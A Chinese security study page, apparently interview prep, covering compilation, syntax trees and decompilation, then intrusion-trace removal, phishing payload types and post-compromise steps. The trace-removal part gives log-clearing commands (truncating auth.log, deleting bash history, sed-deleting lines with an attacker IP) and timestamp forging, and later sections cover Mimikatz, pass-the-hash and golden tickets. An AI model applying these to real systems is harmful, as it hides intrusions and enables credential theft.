<li><strong>恢复旧栈帧</strong>：接着，函数会执行 <code>pop rbp</code>。这会将调用方保存的 <strong>RBP</strong> 值从栈中弹出并恢复到 <strong>RBP</strong> 寄存器中，从而恢复到调用方的栈帧</li>
<li><strong>返回指令</strong>：最后，函数执行 <code>ret</code> 指令。<code>ret</code> 指令的作用是：<ul>
<li>从栈中弹出返回地址</li>
<li>将 <strong>RIP</strong>（指令指针寄存器）的值设置为弹出的返回地址，从而将程序的控制权交还给调用方的下一条指令</li>
</ul>
</li>
<li><strong>参数清理</strong>：在某些调用约定（如 <code>cdecl</code>）中，调用方需要负责清理栈上用于参数传递的空间。然而在 <code>fastcall</code> 等现代约定中，由于参数主要通过寄存器传递，这个步骤变得简化。如果参数是通过栈传递的，<code>ret</code> 指令后面通常会带一个立即数，告诉 CPU 在返回前额外弹出多少字节的栈空间</li>
</ol>
<hr>
<h3 id="解释程序的编译和链接，编译的过程中会有哪些操作"><a href="#解释程序的编译和链接，编译的过程中会有哪些操作" class="headerlink" title="解释程序的编译和链接，编译的过程中会有哪些操作"></a>解释程序的编译和链接，编译的过程中会有哪些操作</h3><p><strong>编译：从源代码到目标代码</strong></p>
<p><strong>编译（Compilation）</strong> 是一个多阶段的过程，它将我们用高级语言（如 C、C++）编写的源代码，转换成机器能理解的低级代码。这个过程通常由编译器（如 GCC, Clang）完成，可以细分为以下几个阶段：</p>
<p><strong>1. 预处理 (Preprocessing)</strong></p>
<p><strong>预处理器</strong>是编译过程的第一个阶段。它的主要工作是处理源代码中的预处理指令，这些指令以 <code>#</code> 开头</p>
<ul>
<li><strong>头文件包含</strong>：<code>#include &lt;stdio.h&gt;</code> 指令会将 <code>stdio.h</code> 文件的内容完整地复制到当前文件中</li>
<li><strong>宏展开</strong>：<code>#define PI 3.14159</code> 会将所有出现的 <code>PI</code> 替换为 <code>3.14159</code></li>
<li><strong>条件编译</strong>：<code>#ifdef DEBUG</code> 和 <code>#endif</code> 这类指令会根据特定条件决定是否编译某段代码</li>
</ul>
<p>预处理阶段完成后，会生成一个**<code>.i</code> 文件**，它是一个纯文本文件，包含了所有展开后的代码，没有任何 <code>#</code> 指令</p>
<p><strong>2. 编译 (Compiling)</strong></p>
<p>在这个阶段，<strong>编译器</strong>开始真正的工作。它会检查预处理后的 <code>.i</code> 文件，进行语法分析和语义分析，并将其转换成<strong>汇编代码</strong></p>
<ul>
<li><strong>语法分析</strong>：检查代码是否符合语言的语法规则，比如括号是否匹配，分号是否遗漏</li>
<li><strong>语义分析</strong>：理解代码的含义，比如变量是否已声明，类型是否匹配</li>
<li><strong>中间代码生成</strong>：生成一种与特定机器无关的中间代码</li>
<li><strong>代码优化</strong>：对中间代码进行各种优化，例如删除不必要的代码、简化表达式等，以提高程序运行效率</li>
</ul>
<p>这个阶段会生成一个**<code>.s</code> 文件**，里面全是人类可读的汇编语言指令</p>
<p><strong>3. 汇编 (Assembling)</strong></p>
<p><strong>汇编器</strong>负责将汇编代码 <code>.s</code> 文件转换成机器码</p>
<ul>
<li>它将每条汇编指令翻译成对应的二进制机器指令</li>
<li>同时，它会处理程序中使用的各种符号（比如函数名和全局变量名），并在一个<strong>符号表</strong>中记录下它们的位置</li>
</ul>
<p>汇编完成后，会生成一个**<code>.o</code> 文件**，也称为<strong>目标文件</strong>（Object File）。这个文件是二进制格式，但它还不是一个可执行文件，因为它可能依赖于其他文件中的函数或数据</p>
<p><strong>链接：将目标文件组装成可执行文件</strong></p>
<p><strong>链接（Linking）</strong> 是编译过程的最后一个阶段。<strong>链接器</strong>（Linker）的工作是把一个或多个<strong>目标文件</strong>以及需要的<strong>库文件</strong>（Library Files）组合在一起，创建出一个完整的可执行文件</p>
<p>链接过程主要解决两个问题：</p>
<ol>
<li><strong>符号解析（Symbol Resolution）</strong>：当你在一个目标文件中调用另一个目标文件中的函数时，比如 <code>main.o</code> 调用了 <code>printf</code> 函数，编译器在 <code>main.o</code> 中只知道 <code>printf</code> 的名字，但不知道它在哪里。链接器会找到 <code>printf</code> 所在的库文件（比如 <code>libc.a</code>），并用 <code>printf</code> 函数的实际内存地址来替换 <code>main.o</code> 中对它的引用</li>
<li><strong>地址重定位（Address Relocation）</strong>：目标文件中的代码和数据地址都是相对于文件开头的。链接器会将它们重新分配到最终可执行文件的内存地址空间中，确保每个函数和变量都有一个唯一的、确定的地址</li>
</ol>
<p>链接完成后，我们最终得到一个完整的、可以直接运行的<strong>可执行文件</strong></p>
<hr>
<h3 id="说说-If-Else-语法树"><a href="#说说-If-Else-语法树" class="headerlink" title="说说 If&#x2F;Else 语法树"></a>说说 If&#x2F;Else 语法树</h3><p><strong><code>If/Else</code> 语法树的结构</strong></p>
<p>一个典型的 <code>if/else</code> 语法树通常包含一个根节点和三个子节点，反映了 <code>if/else</code> 语句的三个核心部分：</p>
<ol>
<li><strong>条件表达式（Condition Expression）</strong>：这是 <code>if</code> 语句括号里的布尔表达式。它会被编译成判断条件是否为真的机器码。在语法树中，它通常是 <code>if/else</code> 根节点的一个子节点</li>
<li><strong>真分支（True Branch）</strong>：这是当条件表达式为真时执行的代码块。在语法树中，它是一个子树，根节点通常表示为 <code>Then</code> 或 <code>True</code>，其子节点代表了该代码块中的所有语句</li>
<li><strong>假分支（False Branch）</strong>：这是当条件表达式为假时执行的代码块（即 <code>else</code> 后面的部分）。它也是一个子树，根节点通常表示为 <code>Else</code> 或 <code>False</code>，其子节点代表了该代码块中的所有语句</li>
</ol>
<p>如果是一个简单的 <code>if</code> 语句（没有 <code>else</code>），那么假分支节点可能为空或不存在</p>
<p><strong>举例说明</strong></p>
<p>让我们以一段简单的 C 语言代码为例，看看它的 <code>if/else</code> 语法树长什么样</p>
<p><strong>源代码：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (a &gt; <span class="number">5</span>) &#123;</span><br><span class="line">    b = <span class="number">10</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    c = <span class="number">20</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>对应的语法树结构：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">     If-Else</span><br><span class="line">      /  |  \</span><br><span class="line">     /   |   \</span><br><span class="line">  条件   真分支   假分支</span><br><span class="line">   /     |       \</span><br><span class="line">  &gt;      =         =</span><br><span class="line"> / \    / \       / \</span><br><span class="line">a   5  b   10    c   20</span><br></pre></td></tr></table></figure>

<p><strong>节点解释：</strong></p>
<ul>
<li><strong>根节点</strong>：<code>If-Else</code>，表示这是一个条件语句</li>
<li><strong>左子节点</strong>：<code>&gt;</code>，表示条件表达式是比较操作。它的子节点是 <code>a</code> 和 <code>5</code>，表示比较的是变量 <code>a</code> 和常量 <code>5</code></li>
<li><strong>中间子节点</strong>：<code>=</code>，表示真分支的代码是赋值操作。它的子节点是 <code>b</code> 和 <code>10</code></li>
<li><strong>右子节点</strong>：<code>=</code>，表示假分支的代码也是赋值操作。它的子节点是 <code>c</code> 和 <code>20</code></li>
</ul>
<p><strong>语法树的作用</strong></p>
<p>在编译过程中，生成语法树是一个非常关键的中间步骤。编译器利用这个树形结构来：</p>
<ul>
<li><strong>进行语法检查</strong>：确保代码结构正确</li>
<li><strong>生成中间代码</strong>：编译器可以遍历这棵树，将其转换成更低级别的代码表示，如三地址码</li>
<li><strong>进行代码优化</strong>：例如，如果 <code>if</code> 语句的条件是一个常量，并且总是为真或假，编译器可以在编译时就删除掉永远不会执行的分支，从而优化代码</li>
</ul>
<hr>
<h3 id="如何比较两个-C-函数的相似度"><a href="#如何比较两个-C-函数的相似度" class="headerlink" title="如何比较两个 C 函数的相似度"></a>如何比较两个 C 函数的相似度</h3><p><strong>1. 二进制层面比较</strong></p>
<p>这是最直接但最不健壮的方法，通常只作为初步筛选</p>
<ul>
<li><strong>字符串哈希 (MD5&#x2F;SHA-256)</strong>：这是最简单的方法。将函数编译后的机器码提取出来，然后计算其哈希值。<ul>
<li><strong>优点</strong>：速度快，可以快速识别完全相同的函数</li>
<li><strong>缺点</strong>：非常脆弱。任何微小的改动，比如插入一条 <code>NOP</code> 指令、改变局部变量的顺序，都会导致哈希值完全不同。因此，它无法检测代码克隆或相似的代码</li>
</ul>
</li>
<li><strong>模糊哈希 (Fuzzy Hashing)</strong>：与传统的哈希算法不同，模糊哈希（如 <strong>ssdeep</strong> 或 <strong>TLSH</strong>）能够生成一个代表文件或代码块结构特征的哈希值。两个哈希值之间的距离可以用来衡量它们的相似度<ul>
<li><strong>优点</strong>：能够容忍代码中的小改动，可以发现有细微变化的函数</li>
<li><strong>缺点</strong>：对于较大的代码重构（如改变控制流），效果不佳</li>
</ul>
</li>
</ul>
<p><strong>2. 结构层面比较</strong></p>
<p>这种方法比二进制比较更抽象，对编译器的影响和一些代码改动不敏感</p>
<ul>
<li><strong>控制流图 (Control Flow Graph, CFG) 比较</strong>：<ul>
<li><strong>方法</strong>：将每个函数表示为一个控制流图，其中节点是基本块（一系列没有跳转的连续指令），边代表控制流。比较两个函数的相似度就变成了比较它们 CFG 的结构相似度。这通常通过图匹配算法来实现，比如子图同构或图编辑距离（graph edit distance）</li>
<li><strong>优点</strong>：非常健壮。它对寄存器分配、指令顺序等改动不敏感。如果两个函数的逻辑结构相同，即使它们用不同的编译器编译，CFG 也会非常相似</li>
<li><strong>缺点</strong>：算法复杂，计算量大，尤其是在面对大型函数时</li>
</ul>
</li>
<li><strong>函数特征向量 (Function Feature Vectors)</strong>：<ul>
<li><strong>方法</strong>：为每个函数提取一系列特征，并将其表示为一个向量。这些特征可以包括：<ul>
<li>基本块数量</li>
<li>指令数量</li>
<li>算术指令、逻辑指令、跳转指令的比例</li>
<li>循环嵌套深度</li>
<li>函数调用的数量和类型</li>
</ul>
</li>
<li><strong>优点</strong>：将函数简化为数值向量，可以使用简单的距离度量（如欧几里得距离或余弦相似度）进行快速比较，非常适合大规模数据集</li>
<li><strong>缺点</strong>：丢失了结构信息。两个结构完全不同的函数可能会有相似的特征向量，反之亦然</li>
</ul>
</li>
</ul>
<p><strong>3. 语义层面比较</strong></p>
<p>这是最强大但也是最困难的方法，旨在比较函数的行为和功能，而不是其形式</p>
<ul>
<li><p><strong>抽象语法树 (Abstract Syntax Tree, AST) 比较</strong>：</p>
<ul>
<li><strong>方法</strong>：将源代码或反编译代码解析成抽象语法树。比较两个函数的相似度就变成了比较它们 AST 的结构。这通常通过树编辑距离（tree edit distance）算法来实现</li>
<li><strong>优点</strong>：高度抽象，对变量名、代码格式等变化完全免疫，能够准确反映代码的逻辑结构</li>
<li><strong>缺点</strong>：依赖于高质量的反编译器，并且 AST 比较算法同样非常耗时</li>
</ul>
</li>
<li><p><strong>污点分析 (Taint Analysis) 或数据流分析</strong>：</p>
<ul>
<li><strong>方法</strong>：分析函数的输入如何影响其输出。如果两个函数在给定相同输入时产生相同的输出，并且内部数据流路径相似，它们就是相似的</li>
<li><strong>优点</strong>：能够发现功能上完全相同的代码，即使它们的实现方式天差地别</li>
<li><strong>缺点</strong>：非常复杂，很难自动化，且无法处理所有情况</li>
</ul>
<hr>
<h3 id="什么情况下源代码与-IDA-反编译程序的代码差别很大"><a href="#什么情况下源代码与-IDA-反编译程序的代码差别很大" class="headerlink" title="什么情况下源代码与 IDA 反编译程序的代码差别很大"></a>什么情况下源代码与 IDA 反编译程序的代码差别很大</h3></li>
</ul>
<p><strong>1. 编译器优化级别很高</strong></p>
<p>现代编译器（如 GCC、Clang、MSVC）在优化程序性能时，会彻底改变代码的结构，使其变得对机器更友好，但对人来说却很难理解</p>
<ul>
<li><strong>循环展开 (Loop Unrolling)</strong>：编译器会将一个简单的 <code>for</code> 循环展开成一长串重复的代码，以减少循环控制的开销。这会使得原本紧凑的循环逻辑在反编译代码中变得冗长且难以识别</li>
<li><strong>内联函数 (Function Inlining)</strong>：为了消除函数调用的开销，编译器会将小型函数的代码直接插入到调用它的地方。这会使得原本独立的函数在反编译代码中“消失”，并融入到其他函数的逻辑里</li>
<li><strong>寄存器优化</strong>：编译器会尽可能地将变量存储在 CPU 寄存器中，而不是内存。这会使得原本清晰的变量赋值和操作在反编译代码中变得像一系列杂乱的寄存器操作</li>
<li><strong>死代码消除和指令重排</strong>：编译器会移除那些永远不会执行的代码，并重新排列指令以更好地利用 CPU 的流水线。这都会使反编译结果与源代码大相径庭</li>
</ul>
<p><strong>2. 原始代码使用了复杂的语言特性</strong></p>
<p>一些高级语言的特性在编译后会产生非常独特的机器码，这给反编译带来了巨大挑战</p>
<ul>
<li><strong>多态和虚函数</strong>：C++ 中的虚函数和继承机制通常依赖于虚函数表（vtable）。反编译器很难准确地重建类的层次结构和虚函数调用，你看到的可能只是一堆对地址和偏移量的复杂操作</li>
<li><strong>模板和泛型</strong>：C++ 模板在编译时会实例化成多个独立的函数，每个函数对应一种数据类型。反编译器无法知道这些函数原本是模板，只会将它们视为独立的、名字可能被混淆的函数</li>
<li><strong>异常处理</strong>：<code>try-catch</code> 块的实现非常复杂，通常涉及到隐藏的表格和栈展开机制。反编译工具很难将这些底层的跳转和数据表恢复成高级语言的 <code>try-catch</code> 结构</li>
</ul>
<p><strong>3. 程序被混淆或加壳</strong></p>
<p>恶意软件或一些商业软件为了防止逆向分析，会使用各种代码混淆（obfuscation）技术或加壳（packing）</p>
<ul>
<li><strong>代码混淆</strong>：<ul>
<li><strong>控制流平坦化 (Control Flow Flattening)</strong>：将函数原本的线性控制流打乱，通过一个大的 <code>switch</code> 语句或多个 <code>if/else</code> 块来控制程序的执行，使得反编译出来的代码变得像一个复杂的意大利面条式代码</li>
<li><strong>垃圾指令插入</strong>：插入大量无用的指令，使得反编译工具和分析人员难以理解真正的代码逻辑</li>
<li><strong>间接跳转</strong>：使用复杂的计算来确定跳转目标，而不是直接跳转</li>
</ul>
</li>
<li><strong>加壳</strong>：程序被压缩或加密，原始代码只有在运行时才会被解密和执行。IDA Pro 看到的只是一个加载器或解密器，而不是原始代码，除非你先脱壳</li>
</ul>
<p><strong>4. 编译器不同或使用了特定编译器</strong></p>
<ul>
<li>不同的编译器，甚至同一编译器的不同版本，都会产生不同的机器码</li>
<li>某些编译器或工具链（如嵌入式系统编译器）可能会使用不寻常的调用约定或优化策略，这使得常见的反编译工具难以正确地识别函数参数和局部变量</li>
</ul>
<h1 id="25-痕迹清除"><a href="#25-痕迹清除" class="headerlink" title="25- 痕迹清除"></a>25- 痕迹清除</h1><h3 id="清理日志要清理哪些"><a href="#清理日志要清理哪些" class="headerlink" title="清理日志要清理哪些"></a>清理日志要清理哪些</h3><p><strong>1. 系统日志</strong></p>
<p>这是最核心的部分，记录了系统层面的所有操作</p>
<ul>
<li><strong>登录日志（<code>auth.log</code> 或 <code>secure</code>）</strong>：这是最重要的一环，需要清理我们所有登录、<code>su</code>、<code>sudo</code> 等提权操作的记录。这些日志会暴露我们的 IP 地址、用户名和登录时间</li>
<li><strong>Bash 历史记录（<code>~/.bash_history</code>）</strong>：命令行操作记录会直接暴露我们执行过的所有命令，包括文件查找、下载工具、修改配置等。必须彻底清除这个文件，或者在操作前使用 <strong><code>unset HISTFILE</code></strong> 或 <strong><code>history -c</code></strong> 来禁用或清除</li>
<li><strong>任务计划日志（<code>cron.log</code>）</strong>：如果你使用了定时任务来维持权限或者执行特定操作，别忘了清除相关的 <code>cron</code> 日志</li>
<li><strong>内核日志（<code>dmesg</code>）</strong>：虽然不常需要，但某些内核级别的操作或异常也会在这里留下痕迹。</li>
</ul>
<p><strong>2. 应用日志</strong></p>
<p>除了系统日志，很多应用程序也会生成自己的日志文件，同样需要清理</p>
<ul>
<li><strong>Web 服务器日志（如 Apache 的 <code>access.log</code> 和 <code>error.log</code>，Nginx 的 <code>access.log</code> 和 <code>error.log</code>）</strong>：这些日志会记录所有对网站的访问请求，我们的扫描、利用、上传后门等操作都会被记录下来，比如**<code>GET /shell.jsp</code>** 这样的请求</li>
<li><strong>数据库日志（如 MySQL 的 <code>mysql.log</code>、<code>slow.log</code>）</strong>：如果你与数据库进行了交互，日志可能会记录你的连接信息、执行的 SQL 查询等</li>
<li><strong>FTP 服务器日志</strong>：如果你通过 FTP 上传或下载了文件，日志会记录你的连接、用户名和操作</li>
<li><strong>SSH 服务器日志</strong>：与登录日志类似，但更专注于 SSH 连接本身，会记录连接来源和认证尝试</li>
</ul>
<p><strong>3. 其他关键文件和目录</strong></p>
<p>除了日志文件，还有一些其他地方也可能会留下我们的痕迹</p>
<ul>
<li><strong>临时文件（<code>/tmp</code>、<code>/var/tmp</code>）</strong>：在利用漏洞、执行脚本或上传后门时，我们经常会把文件放在临时目录。别忘了清理掉这些文件</li>
<li><strong>上传的后门或工具</strong>：这是最直观的痕迹，确保你上传的所有文件，无论是 <code>webshell</code>、<code>nc</code>、<code>mimikatz</code> 还是其他工具，都已彻底删除</li>
<li><strong>进程信息（<code>/proc</code>）</strong>：虽然系统重启后进程信息会消失，但在操作期间，<strong><code>ps</code></strong> 命令可能会暴露我们运行的恶意进程</li>
<li><strong>文件元数据</strong>：有些高级的痕迹清理会关注文件的创建、修改和访问时间。你可以使用一些工具（如 <strong><code>touch</code></strong>）来修改这些时间戳，使其看起来没有被动过</li>
</ul>
<hr>
<h3 id="如何删除-Linux-机器的入侵痕迹"><a href="#如何删除-Linux-机器的入侵痕迹" class="headerlink" title="如何删除 Linux 机器的入侵痕迹"></a>如何删除 Linux 机器的入侵痕迹</h3><p><strong>1. 消除日志文件中的痕迹</strong></p>
<p>日志文件是系统管理员和安全团队发现入侵的最主要线索。因此，这是痕迹清理的首要目标</p>
<ul>
<li><p><strong>识别和清理日志</strong>：攻击者在入侵后，通常会在以下几个核心日志文件中留下痕迹：</p>
<ul>
<li><code>/var/log/auth.log</code> 或 <code>/var/log/secure</code>：记录用户的登录和认证信息</li>
<li><code>/var/log/lastlog</code>：记录所有用户的最后一次登录时间</li>
<li><code>/var/log/wtmp</code> 和 <code>/var/run/utmp</code>：记录用户的登录&#x2F;登出历史</li>
<li><code>/var/log/cron</code>：记录定时任务（Cron）的执行情况</li>
</ul>
</li>
<li><p><strong>清理方法</strong>：</p>
<ul>
<li><p><strong>方法一：使用工具</strong>。你可以使用像 <strong><code>auditd</code></strong> 这样的工具来监控和篡改日志</p>
</li>
<li><p><strong>方法二：手动清理</strong>。用 <strong><code>vim</code></strong> 或 <strong><code>nano</code></strong> 等文本编辑器打开日志文件，删除你的操作记录。然后，使用 <code>&gt; filename</code> 命令清空日志文件，或者使用 <code>dd</code> 命令来删除特定行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 示例：清空 auth.log</span></span><br><span class="line">&gt; /var/log/auth.log</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>方法三：使用 <code>history -c</code></strong>。清除当前会话的 Bash 历史记录。此外，你还需要手动删除 <code>.bash_history</code> 文件中的记录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">history</span> -c</span><br><span class="line"><span class="built_in">rm</span> /root/.bash_history</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>方法四：使用 <code>sed</code></strong>。这是一种更精确的方法，你可以使用 <code>sed</code> 命令删除包含特定关键词的行，而不影响其他日志</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 示例：删除包含 IP 地址 1.2.3.4 的行</span></span><br><span class="line">sed -i <span class="string">&#x27;/1.2.3.4/d&#x27;</span> /var/log/auth.log</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>重要提示</strong>：在进行任何操作前，最好以最小权限的账户进行，并立即在完成操作后清理该账户的痕迹</p>
</li>
</ul>
<p><strong>2. 删除恶意文件和后门</strong></p>
<p>入侵成功后，攻击者通常会在系统中植入后门程序或 WebShell，以保持持久化访问</p>
<ul>
<li><p><strong>查找恶意文件</strong>：</p>
<ul>
<li><p><strong>按时间戳查找</strong>：使用 <code>find</code> 命令查找在你入侵时间段内被修改过的文件。这通常是发现后门文件最有效的方法</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 示例：查找过去 24 小时内修改过的文件</span></span><br><span class="line">find / -mtime 0 -<span class="built_in">type</span> f -<span class="built_in">print</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>按文件名或类型查找</strong>：查找常见的后门文件名，如 <code>.php</code>、<code>.jsp</code>、<code>.sh</code>，或者包含特定字符串的文件。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 示例：查找所有以 .jsp 结尾的文件</span></span><br><span class="line">find / -name <span class="string">&quot;*.jsp&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>删除文件</strong>：找到可疑文件后，使用 <code>rm</code> 命令将其彻底删除</p>
</li>
</ul>
<p><strong>3. 清理已创建的用户和计划任务</strong></p>
<p>为了保持持久化，攻击者可能会创建新的用户账户或设置定时任务</p>
<ul>
<li><p><strong>删除用户</strong>：</p>
<ul>
<li><p>检查 <code>/etc/passwd</code> 和 <code>/etc/shadow</code> 文件，删除任何可疑的新用户</p>
</li>
<li><p>使用 <code>userdel</code> 命令删除用户账户，并加上 <code>-r</code> 参数同时删除其主目录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">userdel -r maluser</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>清理计划任务</strong>：</p>
<ul>
<li>检查 <code>crontab -l</code> 命令的输出，删除任何可疑的定时任务</li>
<li>检查 <code>/etc/cron.*</code> 目录下的所有文件，以及 <code>/var/spool/cron/</code> 目录下的用户 crontab 文件。</li>
</ul>
</li>
</ul>
<p><strong>4. 消除其他关键痕迹</strong></p>
<p>还有一些其他关键的痕迹需要清理，这些往往被忽略</p>
<ul>
<li><p><strong>SSH 密钥</strong>：检查 <code>~/.ssh/authorized_keys</code> 文件，删除任何你添加的公钥</p>
</li>
<li><p><strong>隐藏文件</strong>：检查你的主目录或系统目录中是否有以 <code>.</code> 开头的隐藏文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -al /home/</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>清除缓存</strong>：清除系统和应用程序的缓存文件</p>
</li>
</ul>
<h1 id="26-钓鱼社工"><a href="#26-钓鱼社工" class="headerlink" title="26- 钓鱼社工"></a>26- 钓鱼社工</h1><h3 id="钓鱼方法除了-exe-这种双击的还有什么"><a href="#钓鱼方法除了-exe-这种双击的还有什么" class="headerlink" title="钓鱼方法除了 exe 这种双击的还有什么"></a>钓鱼方法除了 exe 这种双击的还有什么</h3><p><strong>1. 宏病毒</strong></p>
<p>这是最常见也最危险的钓鱼方式之一。攻击者通常会发送一个带有恶意宏的 Office 文档，比如 <strong>Word 文档（<code>.doc</code>, <code>.docx</code>, <code>.docm</code>）</strong>、<strong>Excel 表格（<code>.xls</code>, <code>.xlsx</code>, <code>.xlsm</code>）</strong> 或 <strong>PowerPoint 演示文稿（<code>.ppt</code>, <code>.pptx</code>, <code>.pptm</code>）</strong></p>
<p>当用户打开文件时，文档会提示“启用内容”或“启用宏”。一旦用户点击，隐藏在宏中的恶意代码就会自动执行，通常用于下载并运行更强大的恶意软件，或者直接窃取本地数据</p>
<p><strong>2. 脚本文件</strong></p>
<p>脚本文件可以直接在系统上运行，而无需用户安装任何程序。它们通常用于执行自动化任务，但也可以被恶意利用</p>
<ul>
<li><strong>VBScript（<code>.vbs</code>）</strong> 和 <strong>JScript（<code>.js</code>）</strong>：这两种脚本文件在 Windows 系统上可以直接运行，攻击者可以伪装成图片、压缩包等，诱骗用户双击执行</li>
<li><strong>PowerShell 脚本（<code>.ps1</code>）</strong>：PowerShell 功能强大，可以执行各种系统操作。攻击者经常利用它来无文件（Fileless）攻击，即恶意代码不写入硬盘，直接在内存中执行，极大地增加了防御难度</li>
<li><strong>批处理文件（<code>.bat</code>, <code>.cmd</code>）</strong>：虽然功能不如 PowerShell 强大，但批处理文件简单易用，可以执行基本的下载和运行命令</li>
</ul>
<p><strong>3. 压缩文件</strong></p>
<p>攻击者经常将恶意文件伪装成压缩包 <strong>（<code>.zip</code>, <code>.rar</code>, <code>.7z</code>）</strong>。这种方法特别有效，因为：</p>
<ul>
<li>它可以绕过一些邮件或网站的安全扫描，因为扫描器通常不会深入检查压缩包内的文件</li>
<li>压缩包内的文件名可以被伪装，比如将恶意脚本命名为 <code>invoice.pdf.vbs</code>，让用户误以为是 PDF 文件</li>
<li>攻击者可以创建自解压压缩包（SFX），用户双击后无需手动解压，恶意代码会自动执行</li>
</ul>
<p><strong>4. 快捷方式文件</strong></p>
<p><strong>快捷方式文件（<code>.lnk</code>）</strong> 是一种非常狡猾的钓鱼方式。它看起来像一个指向其他文件的普通图标，但实际上它可以在用户点击时执行任何命令</p>
<p>攻击者可以创建一个名为“我的账单.pdf”的快捷方式，并将其图标设置为 PDF 图标，但其目标路径却是 PowerShell 脚本，用来下载恶意软件。用户很难从外观上辨别真伪</p>
<p><strong>5. PDF 文件</strong></p>
<p>PDF 文档 <strong>（<code>.pdf</code>）</strong> 也可以成为钓鱼的载体。虽然 PDF 本身是安全的，但它们可以嵌入 JavaScript 代码或利用软件漏洞。攻击者可以：</p>
<ul>
<li>嵌入恶意 JavaScript 脚本，在用户打开文件时执行</li>
<li>利用 Adobe Acrobat 或其他 PDF 阅读器的旧漏洞，在用户打开恶意 PDF 时触发缓冲区溢出等漏洞，从而控制系统</li>
</ul>
<hr>
<h3 id="钓鱼上线的主机如何进行利用"><a href="#钓鱼上线的主机如何进行利用" class="headerlink" title="钓鱼上线的主机如何进行利用"></a>钓鱼上线的主机如何进行利用</h3><p><strong>1. 权限维持和环境侦察</strong></p>
<p>首先，你需要确保这条“上线”的连接不会轻易中断，并尽可能地了解你所处的新环境</p>
<ul>
<li><strong>持久化</strong>：这是首要任务。如果你的初始 Shell 仅仅是一个内存中的进程，一旦机器重启或程序关闭，连接就会丢失。你需要将后门永久地植入系统<ul>
<li><strong>常见方法</strong>：利用 <strong>注册表启动项</strong>、<strong>计划任务</strong>或<strong>服务</strong>。虽然这些方法可能被安全软件拦截，但你必须尝试，并结合 <strong>无文件技术</strong>，例如让启动项执行一个从你服务器下载并反射加载的 PowerShell 脚本</li>
</ul>
</li>
<li><strong>信息收集</strong>：你需要像侦探一样，了解这台主机的一切<ul>
<li><strong>用户信息</strong>：<code>whoami</code>、<code>whoami /all</code>，查看当前用户的权限。是普通用户还是管理员？</li>
<li><strong>网络信息</strong>：<code>ipconfig /all</code>、<code>route print</code>，了解主机的 IP 地址、子网掩码、网关和路由表。这能帮助你绘制网络拓扑图</li>
<li><strong>域环境</strong>：<code>net user /domain</code>、<code>net group &quot;domain computers&quot; /domain</code>，判断主机是否在域内，以及当前用户是否是域用户。如果主机在域内，那么你的攻击范围将大大扩展</li>
<li><strong>系统信息</strong>：<code>systeminfo</code>，了解操作系统版本、补丁情况</li>
<li><strong>杀毒软件</strong>：<code>tasklist</code> 或 <code>Get-Process</code>，检查是否有安全软件正在运行，这决定了你下一步的行动风险</li>
</ul>
</li>
</ul>
<p><strong>2. 凭据窃取与权限提升</strong></p>
<p>获取凭据是横向移动的核心。即使你不是管理员，也可能窃取到管理员的凭据</p>
<ul>
<li><strong>窃取凭据</strong>：这是你最重要的任务<ul>
<li><strong>Mimikatz</strong>：如果拥有管理员权限，可以使用 <strong><code>Mimikatz</code></strong> 提取 <code>lsass.exe</code> 进程中的明文密码、哈希和 Kerberos 票据。这是最直接、最有效的方法</li>
<li><strong>内存转储</strong>：如果无法直接运行 Mimikatz，可以尝试将 <code>lsass.exe</code> 进程的内存转储到文件，再将文件下载到本地进行离线分析</li>
<li><strong>浏览器密码</strong>：许多用户会在浏览器中保存密码。可以找到浏览器的密码存储路径，并尝试使用工具解密</li>
</ul>
</li>
<li><strong>权限提升</strong>：如果当前权限较低，需要想办法获得管理员权限<ul>
<li><strong>内核漏洞</strong>：利用操作系统或驱动程序的漏洞进行提权。例如，Windows 历史上就有很多可被利用的提权漏洞</li>
<li><strong>配置缺陷</strong>：寻找软件安装目录的权限配置问题，或者服务的文件路径没有加引号等问题</li>
</ul>
</li>
</ul>
<p><strong>3. 横向移动与内网渗透</strong></p>
<p>一旦你获得了高权限凭据，就可以将攻击范围从单台主机扩展到整个内网</p>
<ul>
<li><strong>哈希传递（Pass-the-Hash）</strong>：利用窃取到的密码哈希，使用 <strong><code>psexec.py</code></strong> 或 <strong><code>Metasploit</code></strong> 等工具，在不获取明文密码的情况下，以域用户的身份登录其他机器</li>
<li><strong>黄金票据（Golden Ticket）</strong>：如果窃取到了域管理员的哈希，你可以伪造 Kerberos 票据（TGT），从而在整个域内伪装成任何用户</li>
<li><strong>端口扫描</strong>：利用这台主机作为跳板，对内网进行端口扫描，发现其他存活的主机和开放的服务</li>
